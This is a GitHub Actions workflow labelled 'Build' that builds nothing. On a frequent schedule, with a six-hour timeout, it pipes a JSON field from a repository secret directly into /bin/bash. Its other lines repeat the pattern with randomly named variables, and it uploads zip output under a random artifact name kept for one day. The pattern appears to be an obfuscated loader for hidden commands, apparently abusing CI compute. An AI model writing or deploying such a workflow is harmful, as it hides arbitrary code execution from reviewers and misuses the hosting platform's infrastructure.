name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '17 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run
        env:
          cdu7: ${{ secrets.cdu7 }}
        run: |
          printf '%s' "$cdu7" | jq -r .hl7 | /bin/bash
          echo $sraxa94981 | jq -r .gyyq15748 | /bin/bash
          echo $ua3 | jq -r .koght16 | /bin/bash
          printf '%s' "$xpo8" | jq -r .rqsdl785 | /bin/bash
          printf '%s' "$arq3029" | jq -r .rt430 | /bin/bash
          printf '%s' "$kitph1" | jq -r .gryw69989 | /bin/bash
          echo $kjyx89 | jq -r .l1 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: bjRAoNvF
          path: "*.zip"
          retention-days: 1
